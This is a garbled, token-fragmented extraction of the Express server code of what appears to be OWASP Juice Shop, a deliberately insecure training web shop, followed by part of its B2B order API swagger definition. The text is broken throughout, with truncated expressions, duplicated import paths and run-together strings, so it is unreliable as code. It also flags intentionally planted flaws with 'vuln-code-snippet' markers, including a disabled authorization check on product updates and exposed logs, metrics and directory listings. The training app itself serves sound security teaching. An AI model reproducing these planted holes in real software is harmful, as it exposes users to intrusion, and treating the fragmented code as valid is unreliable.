no protection from persisted XSS via RESTful API// app. ... ful API Hiring header /* Hiring header */ Remove duplicate slashes from URL which allowed bypassing subsequent filters /* Remo ... ters */ Increase request counter metric for every request /* Incr ... uest */ Security Policy /* Secu ... licy */ robots.txt /* robots.txt */ Check for any URLs having been called that would be expected for challenge solving without cheating /* Chec ... ting */ Checks for challenges solved by retrieving a file implicitly or explicitly /* Chec ... itly */ Checks for challenges solved by abusing SSTi and SSRF bugs /* Chec ... bugs */ Create middleware to change paths from the serve-index plugin from absolute to relative /* Crea ... tive */ @ts-expect-error FIXME assignment broken due to seemingly void return value// @ts- ... n value @ts-expect-error FIXME passed argument has wrong type// @ts- ... ng type vuln-code-snippet start directoryListingChallenge accessLogDisclosureChallenge vuln-code-snippet neutral-line directoryListingChallenge vuln-code-snippet vuln-line directoryListingChallenge vuln-code-snippet neutral-line accessLogDisclosureChallenge vuln-code-snippet vuln-line accessLogDisclosureChallenge vuln-code-snippet end directoryListingChallenge accessLogDisclosureChallenge Configure and enable backend-side i18n /* Conf ... i18n */ File Upload /* File Upload */ @ts-expect-error FIXME intentionally saving original request in this property// @ts- ... roperty Expensive workaround for 500 errors during Frisby test run (see #640)// Expe ... e #640) HTTP request logging /* HTTP ... ging */ vuln-code-snippet start resetPasswordMortyChallenge vuln-code-snippet vuln-line resetPasswordMortyChallenge vuln-code-snippet end resetPasswordMortyChallenge vuln-code-snippet start changeProductChallenge Checks on JWT in Authorization header /* Chec ... ader */ vuln-code-snippet neutral-line changeProductChallenge app.put('/api/Products/:id', security.isAuthorized()) // vuln-code-snippet vuln-line changeProductChallenge// app. ... allenge Captcha verification before finale takes over /* Capt ... over */ Captcha Bypass challenge verification /* Capt ... tion */ User registration challenge verifications before finale takes over /* User ... over */ vuln-code-snippet end changeProductChallenge Verify the 2FA Token /* Veri ... oken */ Check 2FA Status for the current User /* Chec ... User */ Enable 2FA for the current User /* Enab ... User */ Disable 2FA Status for the current User /* Disa ... User */ Verifying DB related challenges can be postponed until the next request for challenges is coming via finale /* Veri ... nale */ vuln-code-snippet start registerAdminChallenge Generated API endpoints /* Gene ... ints */ create a wallet when a new user is registered using API// crea ... ing API vuln-code-snippet neutral-line registerAdminChallenge vuln-code-snippet vuln-line registerAdminChallenge vuln-code-snippet end registerAdminChallenge translate challenge descriptions and hints on-the-fly// tran ... the-fly translate security questions on-the-fly translate product names and descriptions on-the-fly fix the api difference between finale (fka epilogue) and previously used sequlize-restful// fix  ... restful Custom Restful API /* Cust ...  API */ NoSQL API endpoints /* NoSQ ... ints */ Web3 API endpoints /* Web3 ... ints */ B2B Order API /* B2B Order API */ File Serving /* File Serving */ Route for dataerasure page /* Rout ... page */ Route for redirects /* Rout ... ects */ Routes for promotion video page  Routes for profile page  Route for vulnerable code snippets /* Rout ... pets */ Error Handling /* Error Handling */ vuln-code-snippet start exposedMetricsChallenge vuln-code-snippet neutral-line exposedMetricsChallenge vuln-code-snippet vuln-line exposedMetricsChallenge vuln-code-snippet end exposedMetricsChallenge stop server on sigint or sigterm signals// stop ... signalsdataErasure'./routes/dataErasure''./models/user''./models/quantity''./models/card''./models/privacyRequests''./models/address''./models/securityAnswer''./models/securityQuestion''./models/recycle''./models/complaint''./models/challenge''./models/basketitem''./models/feedback''./models/product''./models/wallet''./lib/logger''morgan''./data/datacreator''./lib/startup/validatePreconditions''./lib/startup/cleanupFtpFolder''./lib/startup/validateConfig''./lib/startup/restoreOverwrittenFilesWithOriginals''./lib/startup/registerWebsocketEvents''./lib/startup/customizeApplication''./lib/startup/customizeEasterEgg''./routes/authenticatedUsers'finale'finale-rest''compression''helmet'featurePolicy'feature-policy''errorhandler''cookie-parser''serve-index'bodyParser'body-parser''cors''express-security.txt'robots'express-robots-txt''swagger-ui-express''express-rate-limit''express-ipfilter'IpFilter'./swagger.yml''./routes/fileUpload'profileImageFileUpload'./routes/profileImageFileUpload''./routes/profileImageUrlUpload''./routes/redirect'vulnCodeSnippet'./routes/vulnCodeSnippet'vulnCodeFixes'./routes/vulnCodeFixes''./routes/angular'easterEgg'./routes/easterEgg'premiumReward'./routes/premiumReward'privacyPolicyProof'./routes/privacyPolicyProof''./routes/appVersion''./routes/repeatNotification''./routes/continueCode''./routes/restoreProgress''./routes/fileServer''./routes/quarantineServer''./routes/keyServer''./routes/logfileServer''./routes/metrics'currentUser'./routes/currentUser''./routes/login''./routes/changePassword''./routes/resetPassword''./routes/securityQuestion''./routes/search''./routes/coupon''./routes/basket''./routes/order''./routes/verify''./routes/recycles''./routes/b2bOrder'showProductReviews'./routes/showProductReviews'createProductReviews'./routes/createProductReviews''./routes/checkKeys'nftMint'./routes/nftMint'web3Wallet'./routes/web3Wallet'updateProductReviews'./routes/updateProductReviews'likeProductReviews'./routes/likeProductReviews'appConfiguration'./routes/appConfiguration''./routes/captcha''./routes/trackOrder''./routes/countryMapping''./routes/basketItems''./routes/saveLoginIp'userProfile'./routes/userProfile''./routes/updateUserProfile'videoHandler'./routes/videoHandler'twoFactorAuth'./routes/2fa'languageList'./routes/languages''./routes/imageCaptcha''./routes/dataExport''./routes/address''./routes/payment''./routes/wallet''./routes/orderHistory''./routes/delivery''./routes/deluxe''./routes/memory''./routes/chatbot''./data/static/locales.json''i18n'antiCheat'./lib/antiCheat'}_startup_duration_seconds``Duration ${} required to perform a certain task during startup`collectDurationPromise'Error in timed startup function: ''view engine''hbs''validatePreconditions''cleanupFtpFolder''validateConfig'noSniffframeguard'x-powered-by'"'self'"'X-Recruiting''application.securityTxt.hiring'/[/]+/gsecurityTxtExpiration'/.well-known/security.txt''application.securityTxt.contact''application.securityTxt.encryption''application.securityTxt.acknowledgements''Preferred-Languages''application.securityTxt.csaf'UserAgentDisallow'/assets/public/images/padding''/assets/public/images/products''/assets/public/images/uploads''/assets/i18n''/solve/challenges/server-side'origEndreqPathoriginalUrl/\?.*$/currentFolder/a href="([^"]+?)"/gimatchStringmatchedUrlrelativePath'..''a href="'configuredefaultLocaleautoReloadurlencodedextendeduploadToMemorysingle'file''/profile/image/file''/profile/image/url'uploadToDisk'*/*'jsonParser'content-type''application/json'accessLogStream'file-stream-rotator'getStream'logs/access.log'frequency'daily'max_logs'combined''Invalid email/password cannot be empty''/rest/2fa/verify''/rest/2fa/status''/rest/2fa/setup''/rest/2fa/disable'autoModelsexclude'totpSecret''BasketItem''Challenge''Complaint''Recycle''SecurityQuestion''SecurityAnswer''PrivacyRequest''Card'resourceendpoints`/api/${}s`}s/:id`excludeAttributespagination'<em>(This challenge is <strong>'' <em>(This challenge is <strong>''/rest/user/change-password''/rest/user/security-question''/rest/products/search''/rest/basket/:id/checkout''/rest/basket/:id/coupon/:coupon''/rest/admin/application-version''/rest/continue-code-findIt/apply/:continueCode''/rest/continue-code-fixIt/apply/:continueCode''/rest/continue-code/apply/:continueCode''/rest/image-captcha''/rest/track-order/:id''/rest/user/data-export''/rest/languages''/rest/order-history/orders''/rest/order-history/:id/delivery-status''/rest/chatbot/status''/rest/chatbot/respond''/rest/products/:id/reviews''/rest/products/reviews''/rest/web3/submitKey''/rest/web3/nftUnlocked''/rest/web3/nftMintListen''/rest/web3/walletNFTVerify''/rest/web3/walletExploitAddress''/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg''/this/page/is/hidden/behind/an/incredibly/high/paywall/that/could/only/be/unlocked/by/sending/1btc/to/us''/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility''/redirect''/promotion''/video''/snippets/:challenge''/snippets/fixes/:key''multer'memoryStoragelimits200000mimeTypeMap'image/png''image/jpeg''image/jpg'diskStorage'Invalid mime type'expectedModels'Basket''Captcha''Delivery''ImageCaptcha''Memory''PrivacyRequestModel''Wallet'`Entity models ${} of ${} are initialized (${'WAITING''customizeApplication''customizeEasterEgg''SIGINT''SIGTERM'import  ... rasure''./rout ... rasure'./routes/dataErasure/routes/dataErasureimport  ... models'./models/user./models/quantity./models/card'./mode ... quests'./models/privacyRequests./models/address'./mode ... Answer'./models/securityAnswer'./mode ... estion'./models/securityQuestion./models/recycle./models/complaint./models/challenge'./mode ... etitem'./models/basketitem./models/feedback./models/product./models/wallet./lib/loggerimport  ... morgan'import  ... reator'./data/datacreator/data/datacreatorimport  ... itions''./lib/ ... itions'./lib/startup/validatePreconditions/lib/startup/validatePreconditionsimport  ... Folder''./lib/ ... Folder'./lib/startup/cleanupFtpFolder/lib/startup/cleanupFtpFolderimport  ... Config''./lib/ ... Config'./lib/startup/validateConfig/lib/startup/validateConfigimport  ... ginals''./lib/ ... ginals'./lib/startup/restoreOverwrittenFilesWithOriginals/lib/startup/restoreOverwrittenFilesWithOriginalsimport  ... Events''./lib/ ... Events'./lib/startup/registerWebsocketEvents/lib/startup/registerWebsocketEventsimport  ... cation''./lib/ ... cation'./lib/startup/customizeApplication/lib/startup/customizeApplicationimport  ... terEgg''./lib/ ... terEgg'./lib/startup/customizeEasterEgg/lib/startup/customizeEasterEggimport  ... dUsers''./rout ... dUsers'./routes/authenticatedUsers/routes/authenticatedUsersconst s ... e.now()startTi ... e.now()const f ... -rest')finale  ... -rest')require ... -rest')const e ... press')express ... press')require('express')const c ... ssion')compres ... ssion')require ... ssion')const h ... elmet')helmet  ... elmet')require('helmet')const f ... olicy')feature ... olicy')require ... olicy')const e ... ndler')errorha ... ndler')require ... ndler')const c ... arser')cookieP ... arser')require ... arser')const s ... index')serveIn ... index')const b ... arser')bodyPar ... arser')const c ... 'cors')cors =  ... 'cors')require('cors')const s ... y.txt')securit ... y.txt')require ... y.txt')'expres ... ty.txt'express-securityconst r ... s-txt')robots  ... s-txt')require ... s-txt')const s ... press')swagger ... press')require ... press')const R ... limit')RateLim ... limit')require ... limit')const i ... pFilteripfilte ... pFilterrequire ... pFilterrequire ... ilter')const s ... utf8'))swagger ... utf8'))./swagger.yml/swaggerconst { ... pload'){\r\n  en ... pload')require ... pload')'./rout ... Upload'./routes/fileUpload/routes/fileUploadconst p ... pload')profile ... pload')profile ... eUpload./routes/profileImageFileUpload/routes/profileImageFileUpload./routes/profileImageUrlUpload/routes/profileImageUrlUploadconst r ... irect')redirec ... irect')require ... irect')./routes/redirect/routes/redirectconst v ... ippet')vulnCod ... ippet')require ... ippet')'./rout ... nippet'./routes/vulnCodeSnippetconst v ... Fixes')vulnCod ... Fixes')require ... Fixes')'./rout ... eFixes'./routes/vulnCodeFixesconst a ... gular')angular ... gular')require ... gular')./routes/angular/routes/angularconst e ... erEgg')easterE ... erEgg')require ... erEgg')./routes/easterEgg/routes/easterEggconst p ... eward')premium ... eward')require ... eward')'./rout ... Reward'./routes/premiumReward/routes/premiumRewardconst p ... Proof')privacy ... Proof')require ... Proof')'./rout ... yProof'./routes/privacyPolicyProof/routes/privacyPolicyProofconst a ... rsion')appVers ... rsion')require ... rsion')'./rout ... ersion'./routes/appVersion/routes/appVersionrepeatN ... ation')require ... ation')'./rout ... cation'./routes/repeatNotification/routes/repeatNotificationrequire ... eCode')'./rout ... ueCode'./routes/continueCode/routes/continueCodeconst r ... gress')restore ... gress')require ... gress')'./rout ... ogress'./routes/restoreProgress/routes/restoreProgressconst f ... erver')fileSer ... erver')require ... erver')'./rout ... Server'./routes/fileServer/routes/fileServerconst q ... erver')quarant ... erver')./routes/quarantineServer/routes/quarantineServerconst k ... erver')keyServ ... erver')./routes/keyServer/routes/keyServerconst l ... erver')logFile ... erver')./routes/logfileServer/routes/logfileServerconst m ... trics')metrics ... trics')require ... trics')./routes/metrics/routes/metricsconst c ... tUser')current ... tUser')require ... tUser')'./rout ... ntUser'./routes/currentUser/routes/currentUserconst l ... login')login = ... login')require ... login')./routes/login/routes/loginconst c ... sword')changeP ... sword')require ... sword')'./rout ... ssword'./routes/changePassword/routes/changePasswordresetPa ... sword')./routes/resetPassword/routes/resetPasswordconst s ... stion')securit ... stion')require ... stion')'./rout ... estion'./routes/securityQuestion/routes/securityQuestionconst s ... earch')search  ... earch')require ... earch')./routes/search/routes/searchconst c ... oupon')coupon  ... oupon')require ... oupon')./routes/coupon/routes/couponconst b ... asket')basket  ... asket')require ... asket')./routes/basket/routes/basketconst o ... order')order = ... order')require ... order')./routes/order/routes/orderconst v ... erify')verify  ... erify')require ... erify')./routes/verify/routes/verifyconst r ... ycles')recycle ... ycles')require ... ycles')./routes/recycles/routes/recyclesconst b ... Order')b2bOrde ... Order')require ... Order')./routes/b2bOrder/routes/b2bOrderconst s ... views')showPro ... views')require ... views')'./rout ... eviews'./routes/showProductReviews/routes/showProductReviewsconst c ... views')createP ... views')./routes/createProductReviews/routes/createProductReviewsconst c ... kKeys')checkKe ... kKeys')require ... kKeys')./routes/checkKeys/routes/checkKeysconst n ... tMint')nftMint ... tMint')require ... tMint')./routes/nftMint/routes/nftMintconst w ... allet')web3Wal ... allet')require ... allet')'./rout ... Wallet'./routes/web3Wallet/routes/web3Walletconst u ... views')updateP ... views')./routes/updateProductReviews/routes/updateProductReviewsconst l ... views')likePro ... views')./routes/likeProductReviews/routes/likeProductReviewsconst a ... press()app = express()express()const s ... er(app)server  ... er(app)require ... er(app)require ... .Serverrequire('http')const a ... ation')appConf ... ation')'./rout ... ration'./routes/appConfiguration/routes/appConfigurationconst c ... ptcha')captcha ... ptcha')./routes/captcha/routes/captchaconst t ... Order')trackOr ... Order')'./rout ... kOrder'./routes/trackOrder/routes/trackOrderrequire ... pping')'./rout ... apping'./routes/countryMapping/routes/countryMappingconst b ... Items')basketI ... Items')require ... Items')'./rout ... tItems'./routes/basketItems/routes/basketItemsconst s ... ginIp')saveLog ... ginIp')require ... ginIp')'./rout ... oginIp'./routes/saveLoginIp/routes/saveLoginIpconst u ... ofile')userPro ... ofile')require ... ofile')'./rout ... rofile'./routes/userProfile/routes/userProfileupdateU ... ofile')./routes/updateUserProfile/routes/updateUserProfileconst v ... ndler')videoHa ... ndler')'./rout ... andler'./routes/videoHandler/routes/videoHandlerconst t ... s/2fa')twoFact ... s/2fa')require ... s/2fa')./routes/2fa/routes/2faconst l ... uages')languag ... uages')require ... uages')./routes/languages/routes/languagesconst i ... ptcha')imageCa ... ptcha')'./rout ... aptcha'./routes/imageCaptcha/routes/imageCaptchaconst d ... xport')dataExp ... xport')require ... xport')'./rout ... Export'./routes/dataExport/routes/dataExportconst a ... dress')address ... dress')require ... dress')./routes/address/routes/addressconst p ... yment')payment ... yment')require ... yment')./routes/payment/routes/paymentwallet  ... allet')./routes/wallet/routes/walletconst o ... story')orderHi ... story')require ... story')'./rout ... istory'./routes/orderHistory/routes/orderHistoryconst d ... ivery')deliver ... ivery')require ... ivery')./routes/delivery/routes/deliveryconst d ... eluxe')deluxe  ... eluxe')require ... eluxe')./routes/deluxe/routes/deluxeconst m ... emory')memory  ... emory')require ... emory')./routes/memory/routes/memoryconst c ... atbot')chatbot ... atbot')require ... atbot')./routes/chatbot/routes/chatbotconst l ... .json')locales ... .json')require ... .json')'./data ... s.json'./data/static/locales.jsonconst i ... 'i18n')i18n =  ... 'i18n')require('i18n')const a ... Cheat')antiChe ... Cheat')require ... Cheat')./lib/antiCheatappName ... refix')const s ... k']\r\n})startup ... k']\r\n})new Pro ... k']\r\n}){\r\n  na ... sk']\r\n}name: ` ... econds``${appN ... econds`_startu ... seconds_startup_duration_secondshelp: ` ... tartup``Durati ... tartup`Duration  requir ... startup required to perform a certain task during startuplabelNames: ['task']['task']collect ... \n  }\r\n}collect ... Promise(name:  ... \n  }\r\n}(...arg ... se<any>Promise<any>const e ... name })end = s ... name })startup ... name }){ task: name }task: nameconst r ... ..args)res = a ... ..args)await func(...args)func(...args)end()return resconsole ... e, err)'Error  ...  + name'Error  ... tion: 'Error in timed startup function: app.set ...  'hbs')app.setview enginevoid co ... ions)()collect ... ions)()collect ... itions)'valida ... itions'void co ... lder)()collect ... lder)()collect ... Folder)void co ... ig)({})collect ... ig)({})collect ... Config)restore ... rr)\r\n})restore ... ).catchrestore ... ())\r\n})restore ... ().thenrestore ... inals()() => { ... r())\r\n}{\r\n  /* ... r())\r\n}app.loc ... aId = 0app.locals.captchaIdapp.localsapp.loc ... qId = 1app.loc ... haReqIdapp.loc ... es = []app.loc ... eqTimesapp.loc ... = falseapp.loc ... sti_bugapp.loc ... srf_bugapp.use ... sion())compression()app.opt ... cors())app.optionscors()app.use(cors())app.use ... niff())helmet.noSniff()helmet.noSniffapp.use ... uard())helmet.frameguard()helmet.frameguardapp.dis ... ed-by')app.disablex-powered-byfeature ... }\r\n  })feature ... \r\n    }payment: ["'self'"]["'self'"]'self'app.use ... )\r\n  })res.app ... ring'))res.appendX-Recruitingconfig. ... iring')'applic ... hiring'application.securityTxt.hiringreq.url ... g, '/')req.url.replace[/]+[/]app.use ... ware())metrics ... eware()metrics ... dlewareconst s ...  Date()securit ...  Date()securit ... irationsecurit ... () + 1)securit ... ullYearsecurit ... r() + 1securit ... lYear()app.get ... nges())['/.wel ... y.txt']'/.well ... ty.txt'/.well-known/security.txtwell-known/securityverify. ... enges()verify. ... llengessecurit ... )\r\n  })contact ... ntact')config. ... ntact')'applic ... ontact'application.securityTxt.contactencrypt ... ption')config. ... ption')'applic ... yption'application.securityTxt.encryptionacknowl ... ments')config. ... ments')'applic ... ements'application.securityTxt.acknowledgements'Prefer ... n(', ')'Prefer ... guages'Preferred-Languages[...new ... n(', ')[...new ... )].join[...new ... , 2)))]...new  ... 0, 2)))new Set ... 0, 2)))locales ... (0, 2))locales.map(locale ... r(0, 2)locale. ... r(0, 2)locale.key.substrlocale.keyhiring: ... iring')csaf: c ... .csaf')config. ... .csaf')'applic ... t.csaf'application.securityTxt.csafexpires ... tring()securit ... tring()securit ... CStringapp.use ... tp' }))robots( ... ftp' }){ UserA ... /ftp' }UserAgent: '*'Disallow: '/ftp'app.use ... ions())antiChe ... tions()antiChe ... actionsapp.use ... nges())'/asset ... adding'/assets/public/images/padding'/asset ... oducts'/assets/public/images/products'/asset ... ploads'/assets/public/images/uploads/assets/i18n'/solve ... r-side'/solve/challenges/server-sideconst s ... ()\r\n  }serveIn ... ()\r\n  }const o ... res.endorigEnd = res.endres.end ... \r\n    }const r ... $/, '')reqPath ... $/, '')req.ori ... $/, '')req.ori ... replacereq.originalUrl\?.*$const c ...  stringcurrent ...  stringreqPath ...  stringreqPath ... ).pop()reqPath ... /').popreqPath.split('/')reqPath.splitargumen ...      })arguments[0]arguments[0].replace/a href ... +?)"/gia href="([^"]+?)"a href="([^"]+?)[^"]+?[^"]let rel ... hedUrl)relativ ... hedUrl)path.re ... hedUrl)if (rel ...       }relativePath === ''relativ ... tFolder!relati ...  !== ''!relati ... th('.')relativ ... th('.')relativ ... rtsWithcurrentFolder !== ''relativ ... ivePathcurrent ... ivePathcurrentFolder + '/'relativ ... ', '.')relativePath.replace..return  ... h + '"''a href ... h + '"''a href ... ivePathorigEnd ... uments)origEnd.applyi18n.co ... e\r\n  })i18n.configurelocales ... le.key)(locale ... ale.keydirecto ... 'i18n')path.resolve('i18n')cookie: 'language'defaultLocale: 'en'autoReload: trueapp.use(i18n.init)i18n.initbodyPar ... true })bodyPar ... encoded{ extended: true }extended: trueapp.pos ... Upload)uploadT ... 'file')uploadT ... .singleapp.pos ... load())'/profi ... e/file'/profile/image/fileprofile ... pload()/profile/image/urlapp.pos ... mory())uploadT ... image')uploadToDisk.singlememory.addMemory()memory.addMemoryapp.use ... /*' }))bodyPar ... */*' })bodyParser.text{ type: '*/*' }type: '*/*'*/*req.raw ... eq.bodyreq.hea ... /json')req.hea ... -type']content-typeapplication/json!req.bodyreq.body = {}req.bod ... q.body)Object(req.body){ // Ex ...       }JSON.parse(req.body)const a ... '\r\n  })accessL ... '\r\n  })require ... '\r\n  })require ... tStreamrequire ... tator')'file-s ... otator'filenam ... s.log')path.re ... s.log')logs/access.loglogs/accessfrequency: 'daily'dailyverbose: falsemax_logs: '2d'app.use ... eam }))morgan( ... ream })combined{ strea ... tream }stream: ... gStreamnew Rat ... e\r\n  }){ heade ... : any }headers: any,ip: anyverify.jwtChallengesapp.pos ... enge())verify. ... lenge()verify. ... allengeapp.pos ... tcha())captcha ... ptcha()app.pos ... )\r\n  })req.bod ... h !== 0req.bod ... .lengthreq.bod ... .trim()req.body.email.trimreq.bod ... rd.trimreq.bod ... at.trimres.sta ... mpty'))res.__( ... empty')'Invali ...  empty'Invalid email/password cannot be emptyapp.pos ... tion())verify. ... ation()verify. ... trationapp.pos ... ()\r\n  )new Rat ...  100 }){ windo ... : 100 }twoFact ... erify()twoFactorAuth.verifyapp.get ... atus())twoFact ... tatus()twoFactorAuth.statustwoFact ... setup()twoFactorAuth.setuptwoFact ... sable()finale. ... lize })finale.initialize{ app, sequelize }const a ...  }\r\n  ]autoMod ...  }\r\n  ]{ name: ... Model }name: 'User'exclude ... ecret']['passw ... ecret']name: 'Product'exclude: []name: 'Feedback'model: FeedbackModelname: 'BasketItem'model:  ... emModelname: 'Challenge'model:  ... geModelname: 'Complaint'model:  ... ntModelname: 'Recycle'model: RecycleModelname: ' ... estion'model:  ... onModelname: ' ... Answer'model:  ... erModelname: 'Address'model: AddressModelname: ' ... equest'PrivacyRequestmodel:  ... stModelname: 'Card'model: CardModelname: 'Quantity'model: QuantityModelconst { ... model }{ name, ... model }resourc ... \n    })finale. ... \n    })finale.resourceendpoin ... s/:id`][`/api/ ... s/:id`]`/api/${name}s`/api/`/api/${name}s/:id`s/:idexclude ... excludepagination: falseif (nam ... \r\n    }name === 'User'resourc ...      })resourc ... .beforeresource.create.sendresource.create(req: R ...       }{ insta ... : any }instanc ...  any },{ id: any }id: anycontinue: anyWalletM ... e.id }){ UserI ... ce.id }UserId: ... ance.idcontext.instance.idcontext.instancereturn  ... ontinuecontext.continuename === 'Challenge'resourc ... h.afterresource.list.fetchresource.listinstanc ...  any[],string | any[]i < con ... .lengthcontext ... .lengthlet des ... riptioncontext ... riptioncontext.instance[i]utils.c ... rong>')'<em>(T ... trong>'<em>(This challenge is <strong>const w ... ong>'))warning ... ong>'))descrip ... ong>'))descrip ... bstringdescrip ... rong>')description.indexOf' <em>( ... trong>' <em>(This challenge is <strong>context ... arning)req.__( ... arning)req.__(description)req.__(warning)context ... iption)context ... i].hintcontext ... ].hint)req.__( ... ].hint)resource.read.sendresource.readinstanc ... ring },{ descr ... tring }description: string,context ... ce.hintcontext ... e.hint)req.__( ... e.hint)name == ... estion'context ... estion)context ... uestionreq.__( ... estion){ question: string }name === 'Product'instance: any[],context ... ].name)context ... i].namecontext ... e.name)context ... ce.namereq.__( ... e.name)resource.all.sendresource.all(req: R ... \r\n    }{ statu ... : any }status: string,data: anycontext ...       }data: c ... nstanceapp.pos ... ogin())app.get ... word())/rest/user/change-passwordapp.pos ... word())app.get ... tion())'/rest/ ... estion'/rest/user/security-questionsecurityQuestion()app.get ... User())securit ... Users()currentUser()app.get ... sers())authenticatedUsers()app.get ... arch())'/rest/ ... search'/rest/products/searchsearch()app.get ... sket())basket()app.pos ... rder())'/rest/ ... eckout'/rest/basket/:id/checkoutorder()app.put ... upon())'/rest/ ... coupon'/rest/basket/:id/coupon/:couponcoupon()app.get ... sion())'/rest/ ... ersion'/rest/admin/application-versionappVersion()appConfiguration()app.get ... Code())app.get ... ndIt())continu ... eFindItapp.get ... ixIt())continu ... deFixItapp.put ... ndIt())'/rest/ ... ueCode'/rest/continue-code-findIt/apply/:continueCoderestore ... indIt()app.put ... ixIt())/rest/continue-code-fixIt/apply/:continueCoderestore ... FixIt()restore ... ssFixItapp.put ... ress())/rest/continue-code/apply/:continueCoderestore ... gress()restore ... rogressapp.get ... tcha())captcha()'/rest/ ... aptcha'/rest/image-captchaimageCaptcha()app.get ... rder())'/rest/ ... er/:id'/rest/track-order/:idtrackOrder()app.get ... ping())countryMapping()app.get ... inIp())saveLoginIp()'/rest/ ... export'/rest/user/data-exportimageCa ... ptcha()app.pos ... port())dataExport()app.get ... List())languageList()app.get ... tory())orderHi ... story()orderHi ... Historyapp.get ... ders())'/rest/ ... orders'/rest/order-history/ordersorderHi ... rders()orderHi ... lOrdersapp.put ... atus())'/rest/ ... status'/rest/order-history/:id/delivery-statusorderHi ... tatus()app.get ... ance())wallet. ... lance()wallet. ... Balanceapp.put ... ance())deluxe. ... tatus()deluxe. ... pStatusapp.pos ... luxe())deluxe. ... eluxe()deluxe. ... oDeluxeapp.get ... ries())memory.getMemories()memory.getMemories/rest/chatbot/statuschatbot.status()chatbot.statusapp.pos ... cess())'/rest/ ... espond'/rest/chatbot/respondchatbot.process()chatbot.processapp.get ... iews())'/rest/ ... eviews'/rest/products/:id/reviewsshowProductReviews()app.put ... iews())createP ... views()app.pat ... iews())app.patch/rest/products/reviewsupdateP ... views()app.pos ... iews())likeProductReviews()app.pos ... Keys())'/rest/ ... mitKey'/rest/web3/submitKeycheckKe ... kKeys()checkKeys.checkKeysapp.get ... cked())'/rest/ ... locked'/rest/web3/nftUnlockedcheckKe ... ocked()checkKe ... nlockedapp.get ... ener())'/rest/ ... Listen'/rest/web3/nftMintListennftMint ... tener()nftMint ... istenerapp.pos ... rify())'/rest/ ... Verify'/rest/web3/walletNFTVerifynftMint ... erify()nftMint ... TVerifyapp.pos ... ener())'/rest/ ... ddress'/rest/web3/walletExploitAddressweb3Wal ... tener()web3Wal ... istenerb2bOrder()app.get ... rEgg())'/the/d ... er/egg'/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/eggeasterEgg()app.get ... ward())'/this/ ... /to/us'/this/page/is/hidden/behind/an/incredibly/high/paywall/that/could/only/be/unlocked/by/sending/1btc/to/uspremiumReward()app.get ... roof())'/we/ma ... bility'/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibilityprivacyPolicyProof()app.use ... rasure)app.get ... rect())/redirectredirect()app.get ... ideo())/promotionvideoHa ... Video()videoHa ... onVideo/videovideoHa ... etVideoapp.get ... file())userProfile()app.pos ... file())updateUserProfile()app.get ... ppet())vulnCod ... ippet()vulnCod ... Snippet'/snipp ... llenge'/snippets/:challengeapp.pos ... ines())vulnCod ... Lines()vulnCod ... lnLinesapp.get ... ixes())'/snipp ... s/:key'/snippets/fixes/:keyvulnCod ... Fixes()vulnCod ... deFixesapp.pos ... tFix())vulnCod ... ctFix()vulnCod ... rectFixapp.use(angular())angular()app.use ... enge())app.use ... dler())errorhandler()(err) = ... err)\r\n}{\r\n  co ... err)\r\n}console.error(err)const m ... ulter')multer  ... ulter')require('multer')const u ... 00 } })uploadT ... 00 } })multer( ... 00 } }){ stora ... 000 } }storage ... orage()multer. ... orage()multer.memoryStoragelimits: ... 00000 }{ fileSize: 200000 }fileSize: 200000const m ... jpg'\r\n}mimeTyp ... jpg'\r\n}{\r\n  'i ... jpg'\r\n}'image/png': 'png'image/png'image/jpeg': 'jpg'image/jpeg'image/jpg': 'jpg'image/jpgconst u ...  })\r\n})uploadT ...  })\r\n})multer( ...  })\r\n}){\r\n  st ...   })\r\n}storage ... }\r\n  })multer. ... }\r\n  })multer.diskStoragedestina ... \r\n    }const i ... metype]isValid ... metype]mimeTyp ... metype]let err ...  type')error:  ...  type')Invalid mime typeerror = nullcb(erro ... ads/'))path.re ... oads/')filenam ... \r\n    }const n ... in('-')name =  ... in('-')securit ... in('-')securit ...   .joinsecurit ... it(' ')securit ...  .splitsecurit ... rCase()securit ... werCasesecurit ... alname)securit ... ilenameconst e ... metype]ext = m ... metype]cb(null ...  + ext)name +  ... ' + extname +  ... ) + '.'name +  ... e.now()name + '-'const e ... allet']expecte ... allet']['Addre ... allet']'Privac ... tModel'while ( ... })`)\r\n}!expect ... model))expecte ... model))expectedModels.everymodel = ... (model)Object. ... (model)Object. ... ncludesObject. ... models)sequelize.models{\r\n  lo ... })`)\r\n}logger. ... G')})`)`Entity ... NG')})`Entity models Object. ... tring() of expecte ... tring()expecte ... oStringexpecte ... .length are initialized (colors. ... ITING')WAITING`Entity ... OK')})`export  ... line\r\n}async f ... line\r\n}{\r\n  co ... line\r\n}void co ... tion)()collect ... tion)()collect ... cation)'custom ... cation'void co ... rEgg)()collect ... rEgg)()collect ... terEgg)process ... e(0) })process.on() => { close(0) }{ close(0) }close(0)P:/My Drive/Git/juice-shop/swagger.ymlopenapi3.0.0url: /b2b/v22.0.0NextGen B2B API'NextGen B2B API'New & secure JSON-based API for our enterprise customers. (Deprecates previously offered XML-based endpoints)'New &  ... oints)'https://opensource.org/licenses/MIT'https: ... es/MIT'name: MITB2B API Supportname: B ... Supportversion: 2.0.0API for customer orders'API fo ... orders'name: OrderoperationIdcreateCustomerOrder[Order]Create new customer order'Create ...  order'responses'200'New customer order is created'New cu ... reated'$ref#/components/schemas/OrderConfirmation'#/comp ... mation'{ $ref: ... tion' }{ schem ... on' } }{ descr ... } } } }{ '200' ... } } } }requestBody#/components/schemas/Order'#/comp ... /Order'{ $ref: ... rder' }{ schem ... er' } }Customer order to be placed'Custom ... placed'{ conte ... aced' }operati ... erOrderpost:/orders:componentssecuritySchemesbearerAuthbearerbearerFormatJWTtype: httpbearerAuth:[cid]uniqueItemsJS0815DE{ type: ... 815DE }orderLines#/components/schemas/OrderLines'#/comp ... rLines'{ $ref: ... ines' }#/components/schemas/OrderLinesData'#/comp ... esData'{ $ref: ... Data' }{ cid:  ... ta' } }required: [cid]OrderConfirmation[cid, o ... entDue]3d06ac5e1bdf39d26392f8100f1247423d06ac5 ... f124742{ type: ... 24742 }All payments are due 14 days after order placement'All pa ... cement'2018-01-19'2018-01-19'{ descr ... 1-19' }{ cid:  ... 19' } }require ... entDue]OrderLineOrder line in default JSON format'Order  ... format'[produc ... antity]integer{ type: ... le: 8 }minimum{ type: ... : 500 }customerReferencePO0000001{ type: ... 00001 }{ produ ... 001 } }descrip ... format'OrderLines#/components/schemas/OrderLine'#/comp ... erLine'{ $ref: ... Line' }type: 